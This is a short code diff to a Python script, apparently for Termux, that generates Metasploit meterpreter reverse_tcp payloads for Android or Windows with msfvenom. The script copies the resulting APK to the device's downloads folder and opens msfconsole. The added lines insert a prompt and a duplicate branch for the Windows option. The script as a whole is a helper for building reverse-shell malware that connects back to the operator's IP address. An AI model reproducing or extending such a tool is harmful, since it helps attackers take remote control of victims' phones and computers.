@@ -4,6 +4,7 @@ first = "android/meterpreter/reverse_tcp"
 second = "windows/meterpreter/reverse_tcp"
 print("available payloads:", first)
 print("available payloads:", second)
+print("___For selecting type: first or second___")
 Android_payload = input("Enter the payload - first or second: ",)
 os.system("ifconfig")
 print("select your inet-'ip address'.")
@@ -17,6 +18,11 @@ def payload():
         os.system(msfvenom_sentence)
         os.system("cp "+apk_name+" /data/data/com.termux/files/home/storage/downloads")
         os.system("msfconsole")
+    elif Android_payload == "second":
+        os.system(msfvenom_sentence)
+        os.system("cp "+apk_name+" /data/data/com.termux/files/home/storage/downloads")
+        os.system("msfconsole")
     else:
         print("Wrong syntax")
 payload()
+
